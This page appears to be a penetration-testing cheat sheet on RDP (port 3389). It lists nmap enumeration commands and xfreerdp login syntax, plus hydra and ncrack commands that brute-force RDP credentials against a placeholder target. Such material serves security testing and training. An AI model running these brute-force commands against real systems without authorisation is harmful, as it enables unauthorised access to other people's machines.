---
description: Remote Desktop Protocol Enumeration
---

# RDP Enumeratrix

## Remote Desktop Protocol Enumeration

> The RDP is developed by Microsoft for Endpoint Accessing. which allows to display and controls to be transmitted in GUI over Encrytped format.
>
> Its works on POrt 3389.

### Network Mapper

```
nmap -Pn -n -sV -p 3389 #TARGETIP
nmap -Pn -n -sV -sC rdp*.nse #TARGETIP
```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### BruteForce

```
hydra -L username.txt -P password.txt rdp://TARGETIP
ncrack -vv -U username.txt -P password.txt rdp://TARGETIP
```

### Accessing RDP

<pre><code><strong>xfreerdp /u:username /p:"password" /v:#TARGETIP
</strong></code></pre>

